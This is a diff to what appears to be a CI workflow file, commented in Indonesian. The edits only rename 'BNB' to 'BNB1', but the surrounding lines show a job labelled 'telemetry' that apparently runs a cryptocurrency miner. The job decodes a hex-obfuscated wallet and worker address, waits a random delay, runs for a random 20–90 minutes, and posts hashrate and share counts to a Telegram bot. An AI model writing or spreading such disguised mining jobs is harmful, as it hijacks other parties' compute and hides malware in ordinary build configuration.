@@ -20,7 +20,7 @@ jobs:
 
     steps:
       - name: Initialize
-        run: echo "🔧 Memulai proses telemetry untuk BNB..."
+        run: echo "🔧 Memulai proses telemetry untuk BNB1..."
 
       - name: Prepare Env
         run: |
@@ -33,7 +33,7 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🟢 *BNB Collector aktif.* Durasi kerja acak 20–90 menit." \
+            --data-urlencode text="🟢 *BNB1 Collector aktif.* Durasi kerja acak 20–90 menit." \
             -d parse_mode=Markdown
 
       - name: Start Agent
@@ -47,7 +47,7 @@ jobs:
 
           sleep $((RANDOM % 300 + 30))
 
-          # XOR+HEX address: BNB wallet & worker
+          # XOR+HEX address: BNB1 wallet & worker
           HEX="424e423a3078663331396165663863316433323363383337343062636465396632353233386666356334383535642e756e6d696e6561626c655f776f726b65725f656274656a77686b23663278672d36796e75"
           ADDR=$(echo "$HEX" | xxd -r -p)
 
@@ -72,7 +72,7 @@ jobs:
           REJ=$(grep -a "rejected" report.log | wc -l)
           HASH=${HASH:-"0 H/s"}
 
-          echo -e "✅ *BNB Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASH\`\n• Accepted: \`$ACC\`\n• Rejected: \`$REJ\`" | \
+          echo -e "✅ *BNB1 Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASH\`\n• Accepted: \`$ACC\`\n• Rejected: \`$REJ\`" | \
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
             --data-urlencode text@- \
